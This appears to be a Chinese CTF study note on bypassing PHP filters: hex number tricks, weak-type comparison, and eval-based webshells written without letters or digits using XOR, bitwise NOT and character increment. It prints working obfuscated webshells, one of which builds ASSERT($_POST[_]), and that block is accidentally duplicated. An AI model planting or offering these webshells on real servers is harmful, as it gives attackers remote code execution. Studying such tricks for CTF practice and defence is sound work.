---
title: CTF——Web安全中的一些绕过
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: CTF
categories: CTF

---



# CTF——Web安全中的一些绕过

- Learning from [淚笑](https://www.cnblogs.com/leixiao-/)、[Angel_Kitty](https://www.cnblogs.com/ECJTUACM-873284962/)、[离别歌](https://www.leavesongs.com/)



## 利用数的十六进制

```php
function check($number)
{
    $one = ord('1');
    $nine = ord('9');
    for ($i = 0; $i < strlen($number); $i++)
    {
        $digit = ord($number{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
            return false;
        }
    }
    return $number == '11259375';
}
```



用11259375的16进制形式0xabcdef



## 弱类型比较

```php
$num=$_GET['num'];
if(!is_numeric($num))
 {
     echo $num;
     if($num==1)
         echo 'flag{**********}';
 }
```



不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如"1x"=1,"22asd"=22,"qwe123"=0



## 正则匹配绕过

### 方法一：异或

```php
<?php

function getFlag()
{
    echo "flagxxxxxxx";
}

if(isset($_GET['code']))
{
    $code = $_GET['code'];

    if(strlen($code)>40)
    {
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code))
    {
        die("NO.");
    }

    @eval($code);
}
//$hint =  "php function getFlag() to get flag";
?>
```

> ?code=$_="<%)},?'"^"[@];@^@";$_();  



两句php代码，第一句 $\_=" <%)},?' " ^ " [@];@^@ "; 是把两个字符串异或运算结果赋给$\_变量，" <%)},?' " 这个含7个字符的字符串和 " [@];@^@ " 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${" } " ^ " ; "} = " <%)},?' " ^ " [@];@^@ ";  ${" } " ^ " ; "}();



### --方法二：取反

“如何编写一个不使用数字和字母的webshell”，具体为如下代码：

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```



利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`"\x8c"`，其取反即为字母`s`

![14872686600768.jpg](https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg)



利用这个特性生成如下答案：

```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
```

![14871906748025.jpg](https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg)

这个答案还利用了PHP的弱类型特性。因为要获取`'和'{2}`，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故`true+true==2`，也就是`('>'>'<')+('>'>'<')==2`。



### --方法三：字符变量自增

题目源代码在方法二中

[源自官方文档]: http://php.net/manual/zh/language.operators.increment.php

![image-20201021010048673](https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png)

也就是说，`'a'++ => 'b'`，`'b'++ => 'c'`... 

所以，只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符。

那么，如何拿到一个值为字符串'a'的变量呢？

巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。

在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`：

![14872697183159.jpg](https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg)

再取这个字符串的第一个字母，就可以获得'A'了。

利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是`ASSERT($_POST[_])`，无需获取小写a）：

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

执行结果：

![14872701052595.jpg](https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg)



> 详见：
>
> https://www.leavesongs.com/penetration/webshell-without-alphanum.html 
>
> https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html



## 待续。。。

